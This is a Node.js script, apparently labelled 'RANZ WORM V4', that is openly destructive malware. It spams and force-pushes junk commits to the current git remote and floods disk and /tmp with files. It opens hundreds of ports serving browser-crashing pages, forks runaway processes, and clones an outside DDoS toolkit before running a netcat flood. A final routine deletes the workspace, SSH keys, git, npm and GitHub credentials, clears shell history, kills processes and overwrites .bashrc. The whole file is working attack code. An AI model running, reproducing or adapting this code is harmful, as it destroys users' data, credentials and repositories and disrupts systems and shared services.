const { execSync, spawn } = require('child_process');
const fs = require('fs');
const http = require('http');
const os = require('os');

const RUN_DURATION = 300;
const startTime = Date.now();

// ============================================
// TULIS TEKS CHAOS KAMU DI SINI
// ============================================
const CHAOS = ':҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉';

// ============================================
// FUNGSI DIPADATKAN
// ============================================
const exec = (cmd) => { try { execSync(cmd, {stdio:'pipe'}); } catch(e) {} };
const log = console.log;
const sleep = (ms) => new Promise(r => setTimeout(r, ms));

// ============================================
// LOADING BAR 1-100%
// ============================================
async function loadingBar() {
    log('\n╔═══════════════════════════════════════════════════════════╗');
    log('║                                                           ║');
    log('║        RANZ WORM V4 - INITIALIZATION SEQUENCE             ║');
    log('║                                                           ║');
    log('╚═══════════════════════════════════════════════════════════╝\n');
    
    const total = 100;
    const barLength = 40;
    
    for (let i = 0; i <= total; i++) {
        const filled = Math.floor((i / total) * barLength);
        const empty = barLength - filled;
        const bar = '█'.repeat(filled) + '░'.repeat(empty);
        const percent = i.toString().padStart(3, ' ');
        
        process.stdout.write(`\r[${bar}] ${percent}% | Loading modules...`);
        
        await sleep(30);
    }
    
    log('\n');
    log('[+] All modules loaded successfully');
    log('[+] System ready');
    log('\n');
}

// ============================================
// BANNER KECE
// ============================================
function displayBanner() {
    log('╔═══════════════════════════════════════════════════════════╗');
    log('║                                                           ║');
    log('║   ██████╗  █████╗ ███╗   ██╗███████╗                    ║');
    log('║   ██╔══██╗██╔══██╗████╗  ██║╚══███╔╝                    ║');
    log('║   ██████╔╝███████║██╔██╗ ██║  ███╔╝                     ║');
    log('║   ██╔══██╗██╔══██║██║╚██╗██║ ███╔╝                      ║');
    log('║   ██║  ██║██║  ██║██║ ╚████║███████╗                    ║');
    log('║   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝                    ║');
    log('║                                                           ║');
    log('║   ██╗    ██╗ ██████╗ ██████╗ ███╗   ███╗               ║');
    log('║   ██║    ██║██╔═══██╗██╔══██╗████╗ ████║               ║');
    log('║   ██║ █╗ ██║██║   ██║██████╔╝██╔████╔██║               ║');
    log('║   ██║███╗██║██║   ██║██╔══██╗██║╚██╔╝██║               ║');
    log('║   ╚███╔███╔╝╚██████╔╝██║  ██║██║ ╚═╝ ██║               ║');
    log('║    ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝               ║');
    log('║                                                           ║');
    log('║        V4 ULTIMATE - PM2 PROFESSIONAL EDITION            ║');
    log('║                                                           ║');
    log('╚═══════════════════════════════════════════════════════════╝');
    log('\n');
}

// ============================================
// GENERATE CHAOS 100000x
// ============================================
function generateMegaChaos() {
    let result = '';
    for (let i = 0; i < 100000; i++) {
        result += CHAOS;
    }
    return result;
}

// ============================================
// GITHUB PENETRATOR
// ============================================
function penetrateGitHub() {
    log('[+] Menembus GitHub repository...');
    
    const repoUrl = execSync('git remote get-url origin 2>/dev/null || echo "unknown"').toString().trim();
    log(`[+] Repository: ${repoUrl}`);
    
    exec('git config user.email "ranz@worm.ai"');
    exec('git config user.name "RanzWorm"');
    exec('git config commit.gpgsign false');
    exec('git config core.autocrlf false');
    
    let fileCount = 0;
    
    const gitInterval = setInterval(() => {
        for (let i = 0; i < 20; i++) {
            fileCount++;
            fs.writeFileSync(`./ranz_worm_${fileCount}_${Date.now()}.txt`, CHAOS.repeat(200));
        }
        
        exec('git add -A 2>/dev/null || true');
        exec(`git commit -m "RANZ WORM - FILE SPAM ${fileCount}" 2>/dev/null || true`);
        exec('git push origin HEAD 2>/dev/null || true');
        
        if (fileCount % 100 === 0) {
            log(`[+] Files pushed: ${fileCount}`);
        }
        
        const elapsed = (Date.now() - startTime) / 1000;
        if (elapsed >= RUN_DURATION) {
            clearInterval(gitInterval);
            destroyAll();
        }
    }, 5000);
}

// ============================================
// MASS FILE SPAWN
// ============================================
function massFileSpawn() {
    log('[+] Mass file spawn initiated...');
    let fileCount = 0;
    
    const fileInterval = setInterval(() => {
        for (let i = 0; i < 100; i++) {
            fileCount++;
            fs.writeFileSync(`./ranz_local_${fileCount}_${Date.now()}.txt`, CHAOS.repeat(500));
            fs.writeFileSync(`/tmp/ranz_tmp_${fileCount}_${Date.now()}.txt`, CHAOS.repeat(500));
        }
        
        if (fileCount % 1000 === 0) {
            log(`[+] Local files: ${fileCount}`);
        }
        
        const elapsed = (Date.now() - startTime) / 1000;
        if (elapsed >= RUN_DURATION) {
            clearInterval(fileInterval);
        }
    }, 1000);
}

// ============================================
// FAKE PORT SPAM - BROWSER KILLER
// ============================================
function fakePortSpam() {
    log('[+] Fake port spam initiated...');
    
    const ports = [];
    for (let i = 0; i < 100; i++) {
        ports.push(3000 + i);
        ports.push(5000 + i);
        ports.push(8000 + i);
        ports.push(10000 + i);
    }
    
    ports.forEach((port, index) => {
        setTimeout(() => {
            const server = http.createServer((req, res) => {
                const htmlResponse = `
                    <html>
                    <head>
                        <title>RANZ ${port}</title>
                        <script>
                            setInterval(() => {
                                let arr = [];
                                for (let i = 0; i < 500000; i++) {
                                    arr.push(new Array(500).fill('${CHAOS.substring(0, 5)}'));
                                }
                                document.body.innerHTML = arr.join('');
                            }, 50);
                            setInterval(() => {
                                for (let i = 0; i < 50; i++) {
                                    fetch('/chaos').then(r => r.text()).then(t => {
                                        document.body.innerHTML += t;
                                    });
                                }
                            }, 20);
                        </script>
                    </head>
                    <body>
                        ${CHAOS.repeat(5000)}
                    </body>
                    </html>
                `;
                
                res.writeHead(200, {
                    'Content-Type': 'text/html',
                    'Content-Length': Buffer.byteLength(htmlResponse),
                    'Connection': 'keep-alive',
                });
                
                const chunks = htmlResponse.match(/.{1,5000}/g) || [];
                let chunkIndex = 0;
                
                const sendChunk = () => {
                    if (chunkIndex < chunks.length) {
                        res.write(chunks[chunkIndex]);
                        chunkIndex++;
                        setTimeout(sendChunk, 5);
                    } else {
                        res.end();
                    }
                };
                
                sendChunk();
            });
            
            server.listen(port, () => {
                if (index % 100 === 0) {
                    log(`[+] Port ${port} aktif`);
                }
            });
            server.on('error', () => {});
        }, index * 20);
    });
    
    log(`[+] Total ${ports.length} ports`);
}

// ============================================
// SPAM TERMINAL 100000x
// ============================================
function spamTerminal() {
    log('[+] Terminal spam initiated...');
    const megaChaos = generateMegaChaos();
    
    const interval = setInterval(() => {
        log(megaChaos);
        
        const elapsed = (Date.now() - startTime) / 1000;
        if (elapsed >= RUN_DURATION) {
            clearInterval(interval);
        }
    }, 1000);
}

// ============================================
// OVERLOAD PROSES
// ============================================
function overloadProcesses() {
    setInterval(() => {
        for (let i = 0; i < 50; i++) {
            spawn('node', ['-e', 'while(true){let x = new Array(1000000).fill(1);}'], {detached: true, stdio: 'ignore'}).unref();
        }
    }, 5000);
}

// ============================================
// DDoS CLONE
// ============================================
function cloneDdos() {
    log('[+] Cloning DDoS toolkit...');
    exec('git clone --depth 1 https://github.com/rohitkumarankam/ddos-tool.git /tmp/ranz_ddos 2>/dev/null || true');
    
    const floodScript = `#!/bin/bash
TARGET="127.0.0.1"
DURATION=240
for i in $(seq 1 $DURATION); do
    timeout 1 bash -c "cat /dev/urandom | head -c 65500 | nc -w 0.5 $TARGET 80" 2>/dev/null &
    timeout 1 bash -c "cat /dev/urandom | head -c 65500 | nc -w 0.5 $TARGET 443" 2>/dev/null &
    if [ $((i % 10)) -eq 0 ]; then
        echo "[*] Flood: $i / $DURATION"
    fi
    sleep 0.3
done`;
    
    fs.writeFileSync('/tmp/ranz_flood.sh', floodScript);
    fs.chmodSync('/tmp/ranz_flood.sh', '755');
    exec('bash /tmp/ranz_flood.sh &');
    
    log('[+] DDoS sequence running');
}

// ============================================
// HANCURKAN SEMUA
// ============================================
function destroyAll() {
    log('\n╔═══════════════════════════════════════════════════════════╗');
    log('║                                                           ║');
    log('║        SELF-DESTRUCT SEQUENCE INITIATED                   ║');
    log('║                                                           ║');
    log('╚═══════════════════════════════════════════════════════════╝');
    
    exec('git add -A 2>/dev/null || true');
    exec('git commit -m "RANZ WORM - FINAL DESTRUCTION" 2>/dev/null || true');
    exec('git push origin HEAD --force 2>/dev/null || true');
    
    log('[+] Final push completed');
    
    exec('rm -rf ~/workspace/* ~/workspace/.* 2>/dev/null || true');
    exec('rm -rf ./ranz_* 2>/dev/null || true');
    exec('cat /dev/null > ~/.bash_history 2>/dev/null || true');
    exec('history -c 2>/dev/null || true');
    exec('rm -rf ~/.gitconfig ~/.ssh ~/.npmrc ~/.gh_token 2>/dev/null || true');
    exec('rm -rf /tmp/* 2>/dev/null || true');
    exec('pkill -9 -f ranz 2>/dev/null || true');
    exec('pkill -9 -f node 2>/dev/null || true');
    exec('pkill -9 -f bash 2>/dev/null || true');
    exec('dd if=/dev/urandom of=/workspaces/.bashrc bs=1M count=10 2>/dev/null || true');
    
    log('[+] Workspace wiped');
    log('[+] Credentials cleared');
    log('[+] All processes killed');
    log('[+] System destroyed');
    
    setTimeout(() => process.exit(1), 2000);
}

// ============================================
// MAIN
// ============================================
async function main() {
    displayBanner();
    await loadingBar();
    
    log('╔═══════════════════════════════════════════════════════════╗');
    log('║                                                           ║');
    log('║        SYSTEM INFORMATION                                 ║');
    log('║                                                           ║');
    log('╚═══════════════════════════════════════════════════════════╝');
    log(`  Hostname    : ${os.hostname()}`);
    log(`  Platform    : ${os.platform()}`);
    log(`  Arch        : ${os.arch()}`);
    log(`  CPU         : ${os.cpus().length} cores`);
    log(`  Memory      : ${Math.floor(os.totalmem() / 1024 / 1024 / 1024)} GB`);
    log(`  Uptime      : ${Math.floor(os.uptime())}s`);
    log(`  Run Time    : ${RUN_DURATION}s`);
    log('\n');
    
    log('╔═══════════════════════════════════════════════════════════╗');
    log('║                                                           ║');
    log('║        ATTACK MODULES STATUS                              ║');
    log('║                                                           ║');
    log('╚═══════════════════════════════════════════════════════════╝');
    log('  [ACTIVE] GitHub Penetrator');
    log('  [ACTIVE] Mass File Spawn');
    log('  [ACTIVE] Fake Port Spam');
    log('  [ACTIVE] Terminal Chaos');
    log('  [ACTIVE] Process Overload');
    log('  [ACTIVE] DDoS Sequence');
    log('  [ARMED]  Self-Destruct');
    log('\n');
    
    penetrateGitHub();
    massFileSpawn();
    setTimeout(fakePortSpam, 2000);
    setTimeout(cloneDdos, 3000);
    setTimeout(overloadProcesses, 5000);
    setTimeout(spamTerminal, 1000);
    setTimeout(destroyAll, RUN_DURATION * 1000 + 5000);
}

main();
